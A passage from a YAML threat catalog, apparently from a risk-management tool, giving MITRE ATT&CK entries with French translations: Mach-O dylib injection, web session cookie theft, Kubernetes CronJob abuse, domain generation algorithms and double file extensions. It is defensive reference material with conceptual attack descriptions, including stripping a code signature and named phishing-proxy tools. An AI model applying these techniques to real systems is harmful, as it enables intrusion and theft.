          \ lorsqu\u2019un binaire est charg\xE9. L\u2019en-t\xEAte LC_LOAD_DYLIB\
          \ d\u2019un binaire Mach-O indique \xE0 macOS et OS X les biblioth\xE8ques\
          \ dynamiques (dylibs) \xE0 charger pendant l\u2019ex\xE9cution. Ceux-ci\
          \ peuvent \xEAtre ajout\xE9s ad hoc au binaire compil\xE9 tant que des ajustements\
          \ sont apport\xE9s au reste des champs et d\xE9pendances. (Citation : \xC9\
          crire un mauvais logiciel malveillant pour OSX) Des outils sont disponibles\
          \ pour effectuer ces modifications.\n\nLes adversaires peuvent modifier\
          \ les en-t\xEAtes binaires Mach-O pour charger et ex\xE9cuter des dylibs\
          \ malveillants \xE0 chaque fois que le binaire est ex\xE9cut\xE9. Bien que\
          \ toute modification invalide les signatures num\xE9riques sur les fichiers\
          \ binaires car le fichier binaire est en cours de modification, cela peut\
          \ \xEAtre corrig\xE9 en supprimant simplement la commande LC_CODE_SIGNATURE\
          \ du fichier binaire afin que la signature ne soit pas v\xE9rifi\xE9e au\
          \ moment du chargement. (Citation : Persistance des logiciels malveillants\
          \ sur OS X)\nhttps://attack.mitre.org/techniques/T1546/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1539
    ref_id: T1539
    name: Steal Web Session Cookie
    description: 'An adversary may steal web application or service session cookies
      and use them to gain access to web applications or Internet services as an authenticated
      user without needing credentials. Web applications and services often use session
      cookies as an authentication token after a user has authenticated to a website.


      Cookies are often valid for an extended period of time, even if the web application
      is not actively used. Cookies can be found on disk, in the process memory of
      the browser, and in network traffic to remote systems. Additionally, other applications
      on the targets machine might store sensitive authentication cookies in memory
      (e.g. apps which authenticate to cloud services). Session cookies can be used
      to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)


      There are several examples of malware targeting cookies from web browsers on
      the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42
      Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting
      malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204)
      by tricking victims into running malicious JavaScript in their browser.(Citation:
      Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)


      There are also open source frameworks such as `Evilginx2` and `Muraena` that
      can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557))
      that can be set up by an adversary and used in phishing campaigns.(Citation:
      Github evilginx2)(Citation: GitHub Mauraena)


      After an adversary acquires a valid cookie, they can then perform a [Web Session
      Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to
      the corresponding web application.

      https://attack.mitre.org/techniques/T1539'
    translations:
      fr:
        name: Voler un cookie de session Web
        description: "Un adversaire peut voler des cookies de session d\u2019applications\
          \ Web ou de services et les utiliser pour acc\xE9der \xE0 des applications\
          \ Web ou \xE0 des services Internet en tant qu\u2019utilisateur authentifi\xE9\
          \ sans avoir besoin d\u2019informations d\u2019identification. Les applications\
          \ et services Web utilisent souvent des cookies de session comme jeton d\u2019\
          authentification une fois qu\u2019un utilisateur s\u2019est authentifi\xE9\
          \ sur un site Web.\n\nLes cookies sont souvent valables pour une p\xE9riode\
          \ prolong\xE9e, m\xEAme si l\u2019application web n\u2019est pas utilis\xE9\
          e activement. Les cookies se trouvent sur le disque, dans la m\xE9moire\
          \ du navigateur et dans le trafic r\xE9seau vers des syst\xE8mes distants.\
          \ En outre, d\u2019autres applications sur la machine cible peuvent stocker\
          \ des cookies d\u2019authentification sensibles en m\xE9moire (par exemple,\
          \ des applications qui s\u2019authentifient aupr\xE8s des services cloud).\
          \ Les cookies de session peuvent \xEAtre utilis\xE9s pour contourner certains\
          \ protocoles d\u2019authentification multifactorielle. (Citation : Passez\
          \ le cookie)\n\nIl existe plusieurs exemples de logiciels malveillants ciblant\
          \ les cookies des navigateurs Web sur le syst\xE8me local. (R\xE9f\xE9rence\
          \ : Kaspersky TajMahal, avril 2019)(Citation : Unit 42 Mac Crypto Cookies\
          \ Janvier 2019) Les adversaires peuvent \xE9galement voler des cookies en\
          \ injectant du contenu JavaScript malveillant dans des sites Web ou en s\u2019\
          appuyant sur [User Execution](https://attack.mitre.org/techniques/T1204)\
          \ en incitant les victimes \xE0 ex\xE9cuter du JavaScript malveillant dans\
          \ leur navigateur. (Citation\_: Talos Roblox Scam 2023)(Citation : Favoris\
          \ Discord de Krebs 2023)\n\nIl existe \xE9galement des frameworks open source\
          \ tels que \xAB Evilginx2 \xBB et \xAB Muraena \xBB qui peuvent collecter\
          \ des cookies de session via un proxy malveillant (par exemple, [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557))\
          \ qui peuvent \xEAtre configur\xE9s par un adversaire et utilis\xE9s dans\
          \ des campagnes de phishing. (Citation : Github evilginx2)(Citation : GitHub\
          \ Mauraena)\n\nUne fois qu\u2019un adversaire a acquis un cookie valide,\
          \ il peut ensuite ex\xE9cuter une technique [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)\
          \ pour se connecter \xE0 l\u2019application Web correspondante.\nhttps://attack.mitre.org/techniques/T1539"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1053.007
    ref_id: T1053.007
    name: Container Orchestration Job
    description: 'Adversaries may abuse task scheduling functionality provided by
      container orchestration tools such as Kubernetes to schedule deployment of containers
      configured to execute malicious code. Container orchestration jobs run these
      automated tasks at a specific date and time, similar to cron jobs on a Linux
      system. Deployments of this type can also be configured to maintain a quantity
      of containers over time, automating the process of maintaining persistence within
      a cluster.


      In Kubernetes, a CronJob may be used to schedule a Job that runs one or more
      containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes
      CronJob) An adversary therefore may utilize a CronJob to schedule deployment
      of a Job that executes malicious code in various nodes within a cluster.(Citation:
      Threat Matrix for Kubernetes)

      https://attack.mitre.org/techniques/T1053/007'
    translations:
      fr:
        name: "Travail d\u2019orchestration de conteneur"
        description: "Les adversaires peuvent abuser de la fonctionnalit\xE9 de planification\
          \ des t\xE2ches fournie par les outils d\u2019orchestration de conteneurs\
          \ tels que Kubernetes pour planifier le d\xE9ploiement de conteneurs configur\xE9\
          s pour ex\xE9cuter du code malveillant. Les t\xE2ches d\u2019orchestration\
          \ de conteneurs ex\xE9cutent ces t\xE2ches automatis\xE9es \xE0 une date\
          \ et une heure sp\xE9cifiques, comme les t\xE2ches cron sur un syst\xE8\
          me Linux. Les d\xE9ploiements de ce type peuvent \xE9galement \xEAtre configur\xE9\
          s pour maintenir une quantit\xE9 de conteneurs au fil du temps, ce qui automatise\
          \ le processus de maintien de la persistance au sein d\u2019un cluster.\n\
          \nDans Kubernetes, un CronJob peut \xEAtre utilis\xE9 pour planifier un\
          \ Job qui ex\xE9cute un ou plusieurs conteneurs afin d\u2019effectuer des\
          \ t\xE2ches sp\xE9cifiques. (Citation : Emplois Kubernetes)(Citation : Kubernetes\
          \ CronJob) Par cons\xE9quent, un adversaire peut utiliser un CronJob pour\
          \ planifier le d\xE9ploiement d\u2019un Job qui ex\xE9cute du code malveillant\
          \ dans divers n\u0153uds d\u2019un cluster. (Citation : Matrice des menaces\
          \ pour Kubernetes)\nhttps://attack.mitre.org/techniques/T1053/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1568.002
    ref_id: T1568.002
    name: Domain Generation Algorithms
    description: "Adversaries may make use of Domain Generation Algorithms (DGAs)\
      \ to dynamically identify a destination domain for command and control traffic\
      \ rather than relying on a list of static IP addresses or domains. This has\
      \ the advantage of making it much harder for defenders to block, track, or take\
      \ over the command and control channel, as there potentially could be thousands\
      \ of domains that malware can check for instructions.(Citation: Cybereason Dissecting\
      \ DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019)\n\nDGAs\
      \ can take the form of apparently random or \u201Cgibberish\u201D strings (ex:\
      \ istgmxdejdnxuyla.ru) when they construct domain names by generating each letter.\
      \ Alternatively, some DGAs employ whole words as the unit by concatenating words\
      \ together instead of letters (ex: cityjulydish.net). Many DGAs are time-based,\
      \ generating a different domain for each time period (hourly, daily, monthly,\
      \ etc). Others incorporate a seed value as well to make predicting future domains\
      \ more difficult for defenders.(Citation: Cybereason Dissecting DGAs)(Citation:\
      \ Cisco Umbrella DGA)(Citation: Talos CCleanup 2017)(Citation: Akamai DGA Mitigation)\n\
      \nAdversaries may use DGAs for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008).\
      \ When contact is lost with the primary command and control server malware may\
      \ employ a DGA as a means to reestablishing command and control.(Citation: Talos\
      \ CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit\
      \ 2017 Activity)\nhttps://attack.mitre.org/techniques/T1568/002"
    translations:
      fr:
        name: "Algorithmes de g\xE9n\xE9ration de domaine"
        description: "Les adversaires peuvent utiliser des algorithmes de g\xE9n\xE9\
          ration de domaine (DGA) pour identifier dynamiquement un domaine de destination\
          \ pour le trafic de commande et de contr\xF4le plut\xF4t que de s\u2019\
          appuyer sur une liste d\u2019adresses IP statiques ou de domaines. Cela\
          \ a l\u2019avantage de rendre beaucoup plus difficile pour les d\xE9fenseurs\
          \ de bloquer, de suivre ou de prendre le contr\xF4le du canal de commande\
          \ et de contr\xF4le, car il peut y avoir des milliers de domaines que les\
          \ logiciels malveillants peuvent v\xE9rifier pour obtenir des instructions.\
          \ (Citation : Cybereason diss\xE8quant les DGA)(Citation : Cisco Umbrella\
          \ DGA)(Citation : Unit\xE9 42 DGA f\xE9vrier 2019)\n\nLes DGA peuvent prendre\
          \ la forme de cha\xEEnes apparemment al\xE9atoires ou de \xAB\_charabia\_\
          \xBB (ex : istgmxdejdnxuyla.ru) lorsqu\u2019elles construisent des noms\
          \ de domaine en g\xE9n\xE9rant chaque lettre. Alternativement, certains\
          \ DGA utilisent des mots entiers comme unit\xE9 en concat\xE9nant des mots\
          \ ensemble au lieu de lettres (ex : cityjulydish.net). De nombreux DGA sont\
          \ bas\xE9s sur le temps, g\xE9n\xE9rant un domaine diff\xE9rent pour chaque\
          \ p\xE9riode (horaire, quotidienne, mensuelle, etc.). D\u2019autres int\xE8\
          grent \xE9galement une valeur de d\xE9part pour rendre la pr\xE9diction\
          \ des domaines futurs plus difficile pour les d\xE9fenseurs. (Citation :\
          \ Cybereason diss\xE8quant les DGA)(Citation : Cisco Umbrella DGA)(Citation\
          \ : Talos CCleanup 2017)(R\xE9f\xE9rence : Akamai DGA Mitigation)\n\nLes\
          \ adversaires peuvent utiliser les DGA \xE0 des fins de [canaux de secours](https://attack.mitre.org/techniques/T1008).\
          \ Lorsque le contact est perdu avec le serveur de commande et de contr\xF4\
          le principal, les logiciels malveillants peuvent utiliser un DGA comme moyen\
          \ de r\xE9tablir la commande et le contr\xF4le. (Citation : Talos CCleanup\
          \ 2017)(Citation : FireEye POSHSPY avril 2017)(Citation : Activit\xE9 ESET\
          \ Sednit 2017)\nhttps://attack.mitre.org/techniques/T1568/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1036.007
    ref_id: T1036.007
    name: Double File Extension
    description: "Adversaries may abuse a double extension in the filename as a means\
      \ of masquerading the true file type. A file name may include a secondary file\
      \ type extension that may cause only the first extension to be displayed (ex:\
      \ <code>File.txt.exe</code> may render in some views as just <code>File.txt</code>).\
      \ However, the second extension is the true file type that determines how the\
      \ file is opened and executed. The real file extension may be hidden by the\
      \ operating system in the file browser (ex: explorer.exe), as well as in any\
      \ software configured using or similar to the system\u2019s policies.(Citation:\
      \ PCMag DoubleExtension)(Citation: SOCPrime DoubleExtension) \n\nAdversaries\
      \ may abuse double extensions to attempt to conceal dangerous file types of\
      \ payloads. A very common usage involves tricking a user into opening what they\
      \ think is a benign file type but is actually executable code. Such files often\
      \ pose as email attachments and allow an adversary to gain [Initial Access](https://attack.mitre.org/tactics/TA0001)\
      \ into a user\u2019s system via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)\
      \ then [User Execution](https://attack.mitre.org/techniques/T1204). For example,\
      \ an executable file attachment named <code>Evil.txt.exe</code> may display\
      \ as <code>Evil.txt</code> to a user. The user may then view it as a benign\
      \ text file and open it, inadvertently executing the hidden malware.(Citation:\
      \ SOCPrime DoubleExtension)\n\nCommon file types, such as text files (.txt,\
      \ .doc, etc.) and image files (.jpg, .gif, etc.) are typically used as the first\
      \ extension to appear benign. Executable extensions commonly regarded as dangerous,\
      \ such as .exe, .lnk, .hta, and .scr, often appear as the second extension and\
      \ true file type.\nhttps://attack.mitre.org/techniques/T1036/007"
    translations:
      fr:
        name: Double extension de fichier
        description: "Les adversaires peuvent abuser d\u2019une double extension dans\
          \ le nom de fichier afin de masquer le v\xE9ritable type de fichier. Un\
